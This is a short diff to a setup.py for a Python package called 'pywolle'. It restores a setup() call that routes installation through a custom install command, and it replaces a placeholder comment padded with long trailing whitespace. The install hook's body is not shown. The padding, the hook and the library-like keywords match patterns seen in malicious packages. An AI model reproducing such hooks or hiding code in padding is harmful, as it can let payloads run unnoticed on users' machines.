@@ -23,4 +23,24 @@ class CustomInstallCommand(install):
         install.run(self)
 
 # Setting up
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+setup(
+    name="pywolle",
+    version=VERSION,
+    author="HW",
+    author_email="",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=long_description,
+    packages=find_packages(),
+    install_requires=[],
+    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],
+    classifiers=[
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Operating System :: Unix",
+        "Operating System :: MacOS :: MacOS X",
+        "Operating System :: Microsoft :: Windows",
+    ],
+    cmdclass={'install': CustomInstallCommand}
+)
